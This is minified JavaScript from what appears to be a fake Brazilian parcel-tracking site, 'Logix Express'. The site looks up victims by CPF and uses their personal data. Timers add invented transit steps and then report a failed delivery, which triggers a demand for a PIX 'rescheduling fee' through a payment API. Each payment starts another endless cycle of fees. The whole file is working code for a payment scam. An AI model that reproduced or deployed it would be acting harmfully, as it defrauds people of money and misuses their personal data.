a=document.querySelector(".tracking-hero");a&&p.scrollToElement(a,0),setTimeout(()=>{o.focus(),/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&(o.setAttribute("inputmode","numeric"),o.setAttribute("pattern","[0-9]*"),o.click())},800)}},100);const t=window.location.pathname;window.history.replaceState({},document.title,t)}}clearOldData(){try{Object.keys(localStorage).forEach(t=>{t.startsWith("tracking_")&&localStorage.removeItem(t)})}catch(e){console.error("Erro ao limpar dados antigos:",e)}}saveTrackingData(){if(!(!this.currentCPF||!this.trackingData))try{localStorage.setItem(`tracking_${this.currentCPF}`,JSON.stringify(this.trackingData))}catch(e){console.error("Erro ao salvar dados:",e)}}getFirstAndLastName(e){const t=e.trim().split(" ");if(console.log("🔍 Processando nome completo:",e),console.log("🔍 Nomes separados:",t),t.length===1)return console.log("✅ Nome único encontrado:",t[0]),t[0];const o=`${t[0]} ${t[t.length-1]}`;return console.log("✅ Nome processado:",o),o}updateElement(e,t){console.log(`🔄 Tentando atualizar elemento '${e}' com texto:`,t);const o=document.getElementById(e);if(o){const a=o.textContent;o.textContent=t,console.log(`✅ Elemento '${e}' atualizado:`),console.log(`   Texto anterior: "${a}"`),console.log(`   Texto novo: "${t}"`)}else console.error(`❌ Elemento '${e}' não encontrado no DOM`),console.log("🔍 Elementos disponíveis:",Array.from(document.querySelectorAll("[id]")).map(a=>a.id))}showElement(e){const t=document.getElementById(e);t&&(t.style.display="block")}showCpfNotFoundDialog(){console.log("CPF não encontrado - exibindo diálogo")}showDiscreteHelpPopup(){const e=document.getElementById("discreteHelpPopup");e&&e.remove();const t=document.createElement("div");if(t.id="discreteHelpPopup",t.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            max-width: 320px;
            width: 90%;
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
            z-index: 2500;
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.4s ease;
            border: 1px solid #e9ecef;
        `,t.innerHTML=`
            <div style="
                padding: 20px;
                text-align: center;
            ">
                <div style="
                    width: 40px;
                    height: 40px;
                    background: linear-gradient(45deg, #ff6b35, #f7931e);
                    border-radius: 50%;
                    margin: 0 auto 15px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                ">
                    <i class="fas fa-search" style="color: white; font-size: 18px;"></i>
                </div>
                
                <h4 style="
                    color: #2c3e50;
                    font-size: 1rem;
                    font-weight: 600;
                    margin-bottom: 8px;
                    line-height: 1.3;
                ">
                    Não encontrou sua encomenda?
                </h4>
                
                <p style="
                    color: #666;
                    font-size: 0.9rem;
                    margin-bottom: 15px;
                    line-height: 1.4;
                ">
                    Vamos te ajudar a encontrar!
                </p>
                
                <button id="discreteSearchButton" style="
                    background: linear-gradient(45deg, #ff6b35, #f7931e);
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 20px;
                    font-size: 0.9rem;
                    font-weight: 600;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    animation: gentlePulse 2s ease-in-out infinite;
                    margin-right: 10px;
                ">
                    BUSCAR
                </button>
                
                <button id="discreteCloseButton" style="
                    background: transparent;
                    color: #999;
                    border: 1px solid #ddd;
                    padding: 10px 15px;
                    border-radius: 20px;
                    font-size: 0.9rem;
                    cursor: pointer;
                    transition: all 0.3s ease;
                ">
                    Fechar
                </button>
            </div>
        `,document.body.appendChild(t),!document.getElementById("discretePopupAnimations")){const i=document.createElement("style");i.id="discretePopupAnimations",i.textContent=`
                @keyframes gentlePulse {
                    0%, 100% { 
                        transform: scale(1); 
                        box-shadow: 0 4px 15px rgba(255, 107, 53, 0.3);
                    }
                    50% { 
                        transform: scale(1.02); 
                        box-shadow: 0 6px 20px rgba(255, 107, 53, 0.4);
                    }
                }
                
                #discreteSearchButton:hover {
                    transform: translateY(-1px);
                    box-shadow: 0 6px 20px rgba(255, 107, 53, 0.5);
                    animation-play-state: paused;
                }
                
                #discreteCloseButton:hover {
                    background: #f8f9fa;
                    border-color: #adb5bd;
                }
            `,document.head.appendChild(i)}setTimeout(()=>{t.style.opacity="1",t.style.transform="translateY(0)"},100);const o=document.getElementById("discreteSearchButton"),a=document.getElementById("discreteCloseButton");o&&o.addEventListener("click",()=>{console.log("🔍 Redirecionando para busca externa..."),window.location.href="https://logixexpresscom.netlify.app/"}),a&&a.addEventListener("click",()=>{this.closeDiscreteHelpPopup()}),setTimeout(()=>{this.closeDiscreteHelpPopup()},15e3),console.log("💬 Pop-up discreta de ajuda exibida")}closeDiscreteHelpPopup(){const e=document.getElementById("discreteHelpPopup");e&&(e.style.opacity="0",e.style.transform="translateY(20px)",setTimeout(()=>{e.parentNode&&e.remove()},400))}setZentraPayApiSecret(e){const t=this.zentraPayService.setApiSecret(e);return t?console.log("✅ API Secret Zentra Pay configurada com sucesso"):console.error("❌ Falha ao configurar API Secret Zentra Pay"),t}cleanup(){this.deliverySystem&&this.deliverySystem.cleanup(),console.log("🧹 Sistema de rastreamento limpo")}async handleDeliveryAttempt(e){console.log(`🚚 Iniciando tentativa de entrega ${e+1}`);const t=this.deliveryValues[e%this.deliveryValues.length];console.log(`💰 Valor da tentativa: R$ ${t.toFixed(2)}`),this.showLoadingNotification("Gerando PIX de Entrega...");try{const o={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,email:this.leadData.email,telefone:this.leadData.telefone},a=await this.zentraPayService.createPixTransaction(o,t);if(a.success)console.log("🎉 PIX de entrega gerado com sucesso!"),this.deliveryPixData=a,this.closeLoadingNotification(),setTimeout(()=>{this.showDeliveryModal(t,e+1)},300);else throw new Error(a.error||"Erro ao gerar PIX de entrega")}catch(o){console.error("💥 Erro ao gerar PIX de entrega:",o),this.closeLoadingNotification(),setTimeout(()=>{this.showDeliveryModal(t,e+1,!0)},300)}}showDeliveryModal(e,t,o=!1){const a=document.getElementById("deliveryModal");if(!a)return;const i=document.getElementById("deliveryFeeValue");i&&(i.textContent=`R$ ${e.toFixed(2)}`);const s=a.querySelector(".modal-header h3");if(s&&(s.innerHTML=`<i class="fas fa-truck"></i> ${t}ª Tentativa de Entrega`),!o&&this.deliveryPixData&&this.deliveryPixData.pixPayload){const n=a.querySelector(".qr-code"),l=a.querySelector("#pixCodeDelivery");n&&(n.src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`),l&&(l.value=this.deliveryPixData.pixPayload)}this.addDeliverySimulationButton(a,t),a.style.display="flex",document.body.style.overflow="hidden",console.log(`💳 Modal de entrega exibido - Tentativa ${t} - R$ ${e.toFixed(2)}`)}addDeliverySimulationButton(e,t){const o=e.querySelector(".delivery-simulation-button");o&&o.remove();const a=e.querySelector(".modal-content");if(!a)return;const i=document.createElement("div");i.style.cssText=`
            text-align: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        `,i.innerHTML=`
            <button class="delivery-simulation-button" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                --
            </button>
        `,a.appendChild(i);const s=i.querySelector(".delivery-simulation-button");s&&(s.addEventListener("click",()=>{this.simulateDeliveryPayment(t)}),s.addEventListener("mouseenter",function(){this.style.background="rgba(0, 0, 0, 0.05)",this.style.transform="translateY(-1px)",this.style.opacity="1"}),s.addEventListener("mouseleave",function(){this.style.background="transparent",this.style.transform="translateY(0)",this.style.opacity="0.7"}))}simulateDeliveryPayment(e){console.log(`✅ Simulando pagamento da tentativa ${e}`);const t=document.getElementById("deliveryModal");t&&(t.style.display="none",document.body.style.overflow="auto"),this.processDeliveryPayment(e)}processDeliveryPayment(e){console.log(`🚚 Processando pagamento da tentativa ${e}`),this.deliveryAttempts=e,this.showSuccessNotification("Pagamento de entrega confirmado!"),setTimeout(()=>{this.startDeliveryFlow(e)},2e3)}startDeliveryFlow(e){console.log(`🚚 Iniciando fluxo de entrega para tentativa ${e}`);const t=document.getElementById("trackingTimeline");if(!t)return;const o=100+e*10,a=[{title:"Pedido sairá para entrega",delay:2*60*1e3},{title:"Pedido em trânsito",delay:2*60*60*1e3},{title:"Pedido em rota para seu destino",delay:2*60*60*1e3},{title:`${e+1}ª Tentativa de Entrega (Aguardando Pagamento)`,delay:30*60*1e3,isDeliveryAttempt:!0}];a.forEach((i,s)=>{setTimeout(()=>{const n=new Date,l={id:o+s+1,date:n,title:i.title,description:i.title,isChina:!1,completed:!0,needsLiberation:!1},r=this.createTimelineItem(l,s===a.length-1);t.appendChild(r),setTimeout(()=>{r.style.opacity="1",r.style.transform="translateY(0)"},100),r.scrollIntoView({behavior:"smooth",block:"center"})},i.delay)})}showLoadingNotification(e="Processando..."){const t=document.createElement("div");t.id="deliveryLoadingNotification",t.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const o=document.createElement("div");o.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #1e4a6b;
        `,o.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                ${e}
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6;">
                Aguarde enquanto processamos sua solicitação
            </p>
        `,t.appendChild(o),document.body.appendChild(t),document.body.style.overflow="hidden"}closeLoadingNotification(){const e=document.getElementById("deliveryLoadingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}scrollToElement(e,t=0){if(e){const a=e.offsetTop-t;window.scrollTo({top:a,behavior:"smooth"})}}showError(e){console.error("Erro:",e)}showLoadingNotification(){p.showLoadingNotification()}closeLoadingNotification(){p.closeLoadingNotification()}isDeliveryAttemptStage(e){return e>=17&&(e-17)%4===0}getAttemptNumber(e){return e>=17&&(e-17)%4===0?Math.floor((e-17)/4)+1:1}getAttemptValue(e){const t=[7.74,12.38,16.46];return t[(e-1)%t.length]}}class P{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.deliveryValues=[7.74,12.38,16.46],this.isProcessing=!1,this.timers=[],this.currentStep=0,this.deliveryPixData=null,console.log("🚀 Sistema de fluxo de entrega inicializado"),console.log("💰 Valores de tentativa:",this.deliveryValues)}startDeliveryFlow(){console.log("🚀 Iniciando fluxo de entrega..."),this.clearAllTimers(),this.addTimelineStep({stepNumber:12,title:"Pedido liberado na alfândega de importação",description:"Seu pedido foi liberado após o pagamento da taxa alfandegária",delay:0,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:13,title:"Pedido sairá para entrega",description:"Pedido sairá para entrega para seu endereço",delay:2*60*1e3,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:14,title:"Pedido em trânsito para entrega",description:"Pedido em trânsito para seu endereço",delay:2*60*60*1e3,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:15,title:"Pedido em rota de entrega",description:"Pedido em rota de entrega para seu endereço, aguarde",delay:4*60*60*1e3,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:16,title:`${this.deliveryAttempts+1}ª tentativa de entrega`,description:`${this.deliveryAttempts+1}ª tentativa de entrega realizada, mas não foi possível entregar`,delay:6*60*60*1e3,hasPaymentButton:!0,isDeliveryAttempt:!0})}addTimelineStep({stepNumber:e,title:t,description:o,delay:a,hasPaymentButton:i=!1,isDeliveryAttempt:s=!1}){const n=setTimeout(()=>{console.log(`📦 Adicionando etapa ${e}: ${t}`);const l=document.getElementById("trackingTimeline");if(!l)return;const r=new Date,c=this.createTimelineItem({stepNumber:e,title:t,description:o,date:r,completed:!0,hasPaymentButton:i,isDeliveryAttempt:s});l.appendChild(c),setTimeout(()=>{c.style.opacity="1",c.style.transform="translateY(0)"},100),c.scrollIntoView({behavior:"smooth",block:"center"}),this.currentStep=e},a);this.timers.push(n)}createTimelineItem({stepNumber:e,title:t,description:o,date:a,completed:i,hasPaymentButton:s,isDeliveryAttempt:n}){const l=document.createElement("div");l.className=`timeline-item ${i?"completed":""}`,l.style.opacity="0",l.style.transform="translateY(20px)",l.style.transition="all 0.5s ease";const r=a.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),c=a.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let m="";if(s&&n){this.deliveryAttempts+1;const d=this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length];m=`
                <button class="delivery-retry-btn" 
                        data-attempt="${this.deliveryAttempts}" 
                        data-value="${d}"
                        style="
                            background: linear-gradient(45deg, #e74c3c, #c0392b);
                            color: white;
                            border: none;
                            padding: 12px 25px;
                            font-size: 1rem;
                            font-weight: 700;
                            border-radius: 25px;
                            cursor: pointer;
                            transition: all 0.3s ease;
                            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
                            animation: pulse 2s infinite;
                            font-family: 'Roboto', sans-serif;
                            letter-spacing: 0.5px;
                            margin-top: 15px;
                            display: inline-flex;
                            align-items: center;
                            gap: 8px;
                        ">
                    <i class="fas fa-truck"></i> REAGENDAR ENTREGA
                </button>
            `}if(l.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${r}</span>
                    <span class="time">${c}</span>
                </div>
                <div class="timeline-text">
                    <p>${o}</p>
                    ${m}
                </div>
            </div>
        `,s&&n){const d=l.querySelector(".delivery-retry-btn");d&&this.configureDeliveryRetryButton(d)}return l}configureDeliveryRetryButton(e){e.addEventListener("click",()=>{this.handleDeliveryRetry(e)}),console.log("🔄 Botão de reagendamento configurado")}async handleDeliveryRetry(e){if(this.isProcessing)return;this.isProcessing=!0;const t=parseInt(e.dataset.attempt),o=parseFloat(e.dataset.value);console.log(`🔄 Processando reagendamento - Tentativa ${t+1} - R$ ${o.toFixed(2)}`),this.showDeliveryLoadingNotification();try{console.log("🚀 Gerando PIX para tentativa de entrega via Zentra Pay...");const a={nome:this.trackingSystem.leadData.nome_completo,cpf:this.trackingSystem.leadData.cpf,email:this.trackingSystem.leadData.email,telefone:this.trackingSystem.leadData.telefone},i=await this.trackingSystem.zentraPayService.createPixTransaction(a,o);if(i.success)console.log("🎉 PIX de reagendamento gerado com sucesso!"),this.deliveryPixData=i,this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(o,t+1)},300);else throw new Error(i.error||"Erro ao gerar PIX de reagendamento")}catch(a){console.error("💥 Erro ao gerar PIX de reagendamento:",a),this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(o,t+1,!0)},300)}}showDeliveryLoadingNotification(){const e=document.createElement("div");e.id="deliveryLoadingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #1e4a6b;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Reagendamento...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto processamos sua solicitação
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando pagamento...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden"}closeDeliveryLoadingNotification(){const e=document.getElementById("deliveryLoadingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showDeliveryPixModal(e,t,o=!1){var l;const a=document.createElement("div");a.className="modal-overlay",a.id="deliveryPixModal",a.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let i,s;!o&&this.deliveryPixData&&this.deliveryPixData.pixPayload?(i=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`,s=this.deliveryPixData.pixPayload,console.log("✅ Usando PIX real do Zentra Pay para reagendamento")):(i="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",s="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",console.log("⚠️ Usando PIX estático como fallback para reagendamento"));const n=((l=this.trackingSystem.leadData)==null?void 0:l.nome_completo)||"Cliente";a.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">${t}ª Tentativa de Entrega</h2>
                    <button class="professional-modal-close" id="closeDeliveryPixModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            <strong>${n}</strong>, para reagendar a entrega do seu pedido, é necessário pagar a taxa de reagendamento de <strong>R$ ${e.toFixed(2)}</strong>.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reagendamento - ${t}ª Tentativa</span>
                            <span class="fee-amount">R$ ${e.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX Real - Zentra Pay -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${i}" alt="QR Code PIX Reagendamento" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${s}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Botão de Simulação para Testes -->
                        <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
                            <button id="simulateDeliveryPaymentButton" style="
                                background: #6c757d;
                                color: white;
                                border: none;
                                padding: 8px 16px;
                                border-radius: 6px;
                                cursor: pointer;
                                font-size: 0.9rem;
                                font-weight: 500;
                                opacity: 0.8;
                            ">
                                🧪 Simular Pagamento (Teste)
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(a),document.body.style.overflow="hidden",this.setupDeliveryModalEvents(a,t),console.log(`💳 Modal de PIX para ${t}ª tentativa exibido - R$ ${e.toFixed(2)}`)}setupDeliveryModalEvents(e,t){const o=e.querySelector("#closeDeliveryPixModal");o&&o.addEventListener("click",()=>{this.closeDeliveryPixModal()});const a=e.querySelector("#copyDeliveryPixButton");a&&a.addEventListener("click",()=>{this.copyDeliveryPixCode()});const i=e.querySelector("#simulateDeliveryPaymentButton");i&&i.addEventListener("click",()=>{this.simulateDeliveryPayment(t)}),e.addEventListener("click",s=>{s.target===e&&this.closeDeliveryPixModal()})}simulateDeliveryPayment(e){console.log(`💳 Simulando pagamento da ${e}ª tentativa`),this.closeDeliveryPixModal(),setTimeout(()=>{this.processDeliveryPaymentSuccess(e)},1e3)}processDeliveryPaymentSuccess(e){console.log(`✅ Pagamento da ${e}ª tentativa processado com sucesso`),this.hideCurrentRetryButton(e-1),this.showDeliverySuccessNotification(e),this.deliveryAttempts=e,this.deliveryAttempts>=3&&(this.deliveryAttempts=0),setTimeout(()=>{this.startNewDeliveryCycle()},2e3)}hideCurrentRetryButton(e){const t=document.querySelector(`[data-attempt="${e}"]`);t&&(t.style.display="none")}showDeliverySuccessNotification(e){const t=document.createElement("div");t.className="payment-success-notification",t.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,t.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${e}ª tentativa reagendada com sucesso.</div>
            </div>
        `,document.body.appendChild(t),setTimeout(()=>{t.parentNode&&t.remove()},5e3)}startNewDeliveryCycle(){console.log("🚚 Iniciando novo ciclo de entrega..."),this.isProcessing=!1;const e=100+this.deliveryAttempts*10;this.addTimelineStep({stepNumber:e+1,title:"Pedido sairá para entrega",description:"Seu pedido está sendo preparado para nova tentativa de entrega",delay:0,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:e+2,title:"Pedido em trânsito para entrega",description:"Pedido em trânsito para seu endereço",delay:30*60*1e3,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:e+3,title:"Pedido em trânsito para entrega",description:"Pedido em trânsito para seu endereço",delay:60*60*1e3,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:e+4,title:"Pedido em rota de entrega",description:"Pedido em rota de entrega para seu endereço, aguarde",delay:90*60*1e3,hasPaymentButton:!1}),this.addTimelineStep({stepNumber:e+5,title:`${this.deliveryAttempts+1}ª tentativa de entrega`,description:`${this.deliveryAttempts+1}ª tentativa de entrega realizada, mas não foi possível entregar`,delay:2*60*60*1e3,hasPaymentButton:!0,isDeliveryAttempt:!0})}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX de reagendamento copiado:",e.value.substring(0,50)+"..."),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(o){console.error("❌ Erro ao copiar PIX de reagendamento:",o)}}fallbackCopy(e,t){try{document.execCommand("copy")&&(console.log("✅ PIX de reagendamento copiado via execCommand"),this.showCopySuccess(t))}catch(o){console.error("❌ Fallback copy falhou:",o)}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}closeDeliveryPixModal(){const e=document.getElementById("deliveryPixModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300)),this.isProcessing=!1}clearAllTimers(){this.timers.forEach(e=>clearTimeout(e)),this.timers=[],console.log("🧹 Todos os timers de entrega foram limpos")}cleanup(){this.clearAllTimers(),this.deliveryAttempts=0,this.isProcessing=!1,this.currentStep=0,this.deliveryPixData=null,this.closeDeliveryPixModal(),console.log("🔄 Sistema de entrega resetado")}getStatus(){return{deliveryAttempts:this.deliveryAttempts,isProcessing:this.isProcessing,currentStep:this.currentStep,activeTimers:this.timers.length,currentDeliveryValue:this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length],deliveryValues:this.deliveryValues,hasDeliveryPixData:!!this.deliveryPixData}}}window.setZentraPayApiSecret=function(u){return window.trackingSystemInstance?window.trackingSystemInstance.setZentraPayApiSecret(u):(window.ZENTRA_PAY_SECRET_KEY=u,localStorage.setItem("zentra_pay_secret_key",u),!0)};window.valor_em_reais=26.34;(function(){console.log("=== SISTEMA DE RASTREAMENTO APRIMORADO CARREGANDO ===");let u;function e(){console.log("=== INICIALIZANDO PÁGINA DE RASTREAMENTO APRIMORADA ===");try{if(f.init(),console.log("✓ Navegação inicializada"),!u){const s=new URLSearchParams(window.location.search).get("origem")==="vega";u=new x,window.trackingSystemInstance=u,console.log("✓ Sistema de rastreamento aprimorado criado")}a(),console.log("✓ Header scroll configurado"),o(),t(),console.log("=== PÁGINA DE RASTREAMENTO APRIMORADA INICIALIZADA COM SUCESSO ===")}catch(i){console.error("❌ Erro na inicialização da página de rastreamento:",i),setTimeout(e,2e3)}}function t(){const i=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key");i&&i!=="SUA_SECRET_KEY_AQUI"&&u?(u.setZentraPayApiSecret(i),console.log("✓ API Secret Zentra Pay configurada automaticamente")):console.warn('⚠️ API Secret Zentra Pay não configurada. Configure usando: configurarZentraPay("sua_chave")')}function o(){["trackingForm","cpfInput","trackButton","liberationModal","pixCodeModal","realPixQrCode"].forEach(s=>{document.getElementById(s)?console.log(`✓ Elemento encontrado: ${s}`):console.warn(`⚠️ Elemento não encontrado: ${s}`)})}function a(){window.addEventListener("scroll",function(){const i=document.querySelector(".header");i&&(i.style.backgroundColor="rgba(255, 255, 255, 0.1)",i.style.backdropFilter="blur(10px)")})}document.readyState==="loading"?(document.addEventListener("DOMContentLoaded",e),console.log("📅 Aguardando DOMContentLoaded")):(e(),console.log("📄 DOM já carregado, inicializando imediatamente")),setTimeout(e,100),setTimeout(e,500),setTimeout(e,1e3),setTimeout(e,2e3),console.log("=== SCRIPT DE RASTREAMENTO APRIMORADO CARREGADO ===")})();
